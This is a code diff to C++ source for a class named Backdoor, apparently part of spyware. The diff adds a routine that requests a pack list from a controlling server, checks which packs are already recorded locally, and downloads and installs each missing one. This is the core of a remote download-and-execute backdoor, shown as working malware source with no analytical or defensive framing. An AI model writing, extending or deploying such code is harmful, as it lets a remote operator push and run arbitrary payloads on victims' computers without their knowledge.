@@ -1,5 +1,6 @@
 #include "backdoor.h"
 #include "../proc.h"
+#include "opt.h"
 
 extern PATH_COMBINE path_combine;
 
@@ -81,6 +82,8 @@ bool Backdoor::dwnl_file(char * file_path) const
 
 void Backdoor::install_pack(const char * file_path) const
 {
+	if (file_path == NULL)
+		return;
 	char * args = new char[MAX_PATH];
 	strcpy(args, "\"");
 	strcat(args, file_path);
@@ -115,6 +118,63 @@ void Backdoor::create_working_dir_if_necessary() const
 	{
 		LOG_D("Working directory is not exist! Creating...");
 		CreateDirectoryA(working_dir, NULL);
+	}
+}
+
+void Backdoor::install_packs_if_necessary()
+{
+	send_header(SPY_BDR_HEADER_PACKS_LIST, 0);
+	byte content_type;
+	int content_length;
+	receive_header(&content_type, &content_length);
+	if (content_type == SPY_BDR_HEADER_PACKS_LIST)
+	{
+		byte * list = new byte[content_length];
+		char * file_path = new char[MAX_PATH];
+		Opt * opt = new Opt(working_dir);
+		try
+		{
+			receive_content(list, 0, content_length);
+			Pack * pack = (Pack *)list;
+			int count_of_local_pack = opt->get_count();
+			bool exists_pack;
+			for (int count = content_length / sizeof(Pack); count > 0; count--, pack++)
+			{
+				if (pack->id == 0)// just ignore spy update pack which has id is 0
+					continue;
+				exists_pack = false;
+				LOG_I("Check pack %d...", pack->id);
+				for (int i = 0; i < count_of_local_pack; i++)
+				{
+					if (opt->get(i)->id == pack->id)
+					{
+						exists_pack = true;
+						break;
+					}
+				}
+				if (!exists_pack)
+				{
+					LOG_I("Pack %d do not exists! download and install it...", pack->id);
+					if (dwnl_pack(pack->id, file_path))
+					{
+						LOG_I("Downloaded pack %d, installing...", pack->id);
+						install_pack(file_path);
+						opt->push(pack);
+					}
+				}
+			}
+		}
+		catch (int error)
+		{
+			LOG_E("Install packs error: %d", error);
+		}
+		catch(...)
+		{
+			LOG_E("Unhandled exception!");
+		}
+		delete opt;
+		delete[] file_path;
+		delete[] list;
 	}
 }
 
